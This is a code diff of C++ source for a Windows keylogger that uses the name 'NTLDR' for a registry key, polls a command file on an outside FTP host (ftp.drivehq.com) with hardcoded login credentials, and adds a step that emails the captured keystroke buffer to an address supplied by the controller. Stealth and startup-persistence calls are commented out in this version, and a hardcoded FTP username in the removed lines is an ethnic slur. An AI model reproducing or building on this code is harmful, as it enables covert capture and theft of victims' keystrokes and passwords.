@@ -6,10 +6,12 @@
     DWORD err = 0;
 
     string tempkeylog_buffer;
+
     const string RegistryKeyName = "NTLDR";
 
     char pathtofile[MAX_PATH]{};
     char ftpreadbuffer[1024]{};
+    char computername[4096]{};
 
 
     map<string, COMMAND> cmds;
@@ -22,8 +24,10 @@
 
 int main(){
 
-    Stealth();
-    AddtoStartup();
+    //Stealth();
+    //AddtoStartup();
+    DWORD dummyword = 4096; //Never used
+    GetComputerName(computername, &dummyword);
 
     cmds["CONTINUE"] = CONTINUE;
     cmds["PAUSE"] = PAUSE;
@@ -36,19 +40,19 @@ int main(){
 
         HINTERNET connection = InternetOpen("ftpkeylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL,0);
 
-        //cout << GetLastError();
+        cout << GetLastError();
 
-        HINTERNET ftpinstance = InternetConnect(connection, "ftp.drivehq.com", INTERNET_DEFAULT_FTP_PORT, "nigganigga", "22073kk", INTERNET_SERVICE_FTP, NULL, NULL);
+        HINTERNET ftpinstance = InternetConnect(connection, "ftp.drivehq.com", INTERNET_DEFAULT_FTP_PORT, "ludibrium", "22073kk", INTERNET_SERVICE_FTP, NULL, NULL);
 
-        //cout << GetLastError();
+        cout << GetLastError();
 
         HINTERNET filehandle = FtpOpenFile(ftpinstance, "command.txt", GENERIC_READ, FTP_TRANSFER_TYPE_ASCII, NULL);
 
-        //cout << GetLastError();
+        cout << GetLastError();
 
         InternetReadFile(filehandle, ftpreadbuffer, 1024, &numberread);
 
-        //cout << GetLastError();
+        cout << GetLastError();
 
         InternetCloseHandle(filehandle);
         //InternetCloseHandle(ftpinstance);
@@ -60,10 +64,11 @@ int main(){
 
         //cout <<reinterpret_cast<char *>(ftpreadbuffer);
 
-            for(int i = 0; ftpreadbuffer[i] != '.'; i++){
+            for(int i = 0; ftpreadbuffer[i] != '*'; i++){
         //cout << ftpreadbuffer[i];
                 if(ftpreadbuffer[i] == '\n'){
 
+                    i++;
                     filetokens.push_back(temporarystr);
                     temporarystr.clear();
 
@@ -74,8 +79,8 @@ int main(){
             }
 
 
-
-    //cout << filetokens[0].c_str() << filetokens[1].c_str();
+    //cout << tempkeylog_buffer.c_str();
+   // cout << filetokens[0].c_str() << filetokens[1].c_str() << filetokens[2].c_str();
 
     map<string, COMMAND>::iterator i = cmds.find(filetokens[0].c_str());
 
@@ -97,6 +102,19 @@ int main(){
             InternetCloseHandle(ftpinstance);
             InternetCloseHandle(connection);
             //cout << GetLastError() << "\n";
+
+            //Really crappy way of verifying properly formated email
+            //But i do not want to learn regex.
+            //Plus user is expected to follow documentations... OR ELSE!
+            if(-1 == filetokens[2].find("@")){
+                //do nothing
+            }else{
+
+                string *ptrpass = new string(tempkeylog_buffer);
+
+                _beginthreadex(NULL,  0, &sendmail, ptrpass, 0, 0);
+
+            } //If there is an @ character
 
             tempkeylog_buffer.clear();
             filetokens.clear();
